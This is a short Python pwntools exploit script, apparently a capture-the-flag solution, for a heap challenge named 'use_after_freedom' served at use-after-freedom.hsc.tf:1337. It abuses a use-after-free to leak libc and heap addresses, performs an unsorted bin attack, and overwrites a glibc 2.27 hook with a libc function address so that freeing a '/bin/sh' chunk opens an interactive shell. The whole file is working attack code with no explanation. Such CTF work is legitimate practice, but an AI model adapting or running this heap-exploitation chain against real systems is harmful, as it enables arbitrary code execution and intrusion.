#!/usr/bin/env python3

from pwn import *

exe = ELF("./use_after_freedom_patched")
libc = ELF("./libc-2.27.so")
ld = ELF("./ld-2.27.so")

context.binary = exe


def conn():
    r = process([exe.path])
    return r


sla = lambda a,b : r.sendlineafter(a,b)
sa = lambda a,b : r.sendafter(a,b)
#r = conn()

def alloc(size, data):
    sla("> ", "1")
    sla("> ", str(size))
    sla("> ", data)

def free(index):
    sla("> ", "2")
    sla("> ", str(index))

def edit(index, data):
    sla("> ", "3")
    sla("> ", str(index))
    sa("> ", data)

def view(index):
    sla("> ", "4")
    sla("> ", str(index))


r = remote("use-after-freedom.hsc.tf", 1337)
#r = conn()
pause()
alloc(0x3940, "MAHER")
alloc(0x200, "IDK")
free(0)
view(0)

leak = u64(r.recvline().strip() + p16(0))
log.warn("leak @ 0x%x", leak)

libc_base = leak - 0x3ebca0
log.warn("Libc base @ 0x%x", libc_base)

pause()
free(1)
edit(1, b"M"*8)
view(1)

r.recvuntil(b"M"*8)
heap = u64(r.recvline().strip() + p16(0))
log.warn("Heap leak @ 0x%x", heap)

edit(0, p64(0) + p64(libc_base + 0x3ed940 - 0x10))
alloc(0x3940, "Unsorted bin attack!")
free(2)
edit(2, p64(libc_base + 0x4f550))
alloc(0x3940, "/bin/sh")
free(3)



r.interactive()
